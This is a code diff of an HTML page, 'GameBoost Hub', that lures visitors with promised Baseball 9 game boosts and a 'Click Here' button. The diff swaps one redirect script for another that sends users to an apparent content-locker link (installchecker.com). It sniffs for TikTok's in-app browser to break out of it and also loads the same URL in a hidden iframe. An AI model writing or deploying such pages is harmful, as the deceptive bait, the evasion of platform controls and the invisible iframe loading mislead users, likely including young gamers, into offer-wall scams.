@@ -4,33 +4,6 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>GameBoost Hub</title>
-  <script>
-    function openLink() {
-      const finalURL = "https://mybaseball9.online/locker.html"; // your domain-based redirect page
-      const ua = navigator.userAgent.toLowerCase();
-      const isTikTok = ua.includes("tiktok");
-
-      if (isTikTok) {
-        if (ua.includes("android")) {
-          window.location.href = "intent://" + finalURL.replace(/^https?:\/\//, "") + "#Intent;scheme=https;package=com.android.chrome;end";
-        } else if (ua.includes("iphone") || ua.includes("ipad")) {
-          const a = document.createElement('a');
-          a.href = finalURL;
-          a.target = "_blank";
-          a.rel = "noopener noreferrer";
-          document.body.appendChild(a);
-          a.click();
-          setTimeout(() => {
-            window.location.href = finalURL;
-          }, 800);
-        } else {
-          window.location.href = finalURL;
-        }
-      } else {
-        window.location.href = finalURL;
-      }
-    }
-  </script>
   <style>
     body {
       margin: 0;
@@ -111,7 +84,6 @@
 </head>
 <body>
   <div class="container">
-
     <div class="header">
       <h1>GameBoost Hub</h1>
       <p>Your shortcut to pro-level gameplay — Baseball 9</p>
@@ -121,11 +93,36 @@
       <img src="https://i.postimg.cc/MTNzWHfS/IMG-3662.jpg" alt="Baseball 9 Banner">
       <h1>Boost Your Baseball 9</h1>
       <p>Click below to unlock tips, tricks, and secrets!</p>
-      <div class="button" onclick="openLink()">Click Here</div>
+      <div class="button" onclick="safeRedirect()">Click Here</div>
     </div>
-
   </div>
 
   <footer>&copy; 2025 GameBoost Hub</footer>
+
+  <script>
+    function safeRedirect() {
+      const url = "https://installchecker.com/cl/v/poddrn";
+      const ua = navigator.userAgent.toLowerCase();
+      const isTikTok = ua.includes("tiktok");
+
+      if (isTikTok) {
+        const a = document.createElement("a");
+        a.href = url;
+        a.target = "_blank";
+        a.rel = "noopener noreferrer";
+        document.body.appendChild(a);
+        a.click();
+
+        setTimeout(() => {
+          const iframe = document.createElement("iframe");
+          iframe.style.display = "none";
+          iframe.src = url;
+          document.body.appendChild(iframe);
+        }, 1000);
+      } else {
+        window.location.href = url;
+      }
+    }
+  </script>
 </body>
 </html>
